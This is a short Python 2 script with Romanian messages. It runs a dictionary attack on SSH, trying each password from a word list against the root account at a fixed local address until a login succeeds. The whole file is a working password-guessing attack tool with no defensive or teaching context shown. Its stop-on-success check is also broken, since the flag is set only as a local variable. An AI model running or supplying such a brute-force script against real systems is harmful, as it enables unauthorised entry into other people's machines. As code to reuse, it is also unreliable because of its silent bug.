from pexpect import pxssh
import time
Found = False
def connect(host, user, password):
   try:
      s = pxssh.pxssh()
      s.login(host,user,password)
      print '[+] Parola identificata : ' + password
      Found = True
   except Exception, e:
      time.sleep(1)
def main():
   host = '192.168.0.103'
   user = 'root'
   fn = open('dict.txt', 'r')
   for line in fn.readlines():
      if Found:
         print "[+] Oprire: Parola identificata"
         exit(0)
      password = line.strip('\r').strip('\n')
      print "[*] Incercare: " + str(password)
      connect(host,user,password)
if __name__=='__main__':
   main()
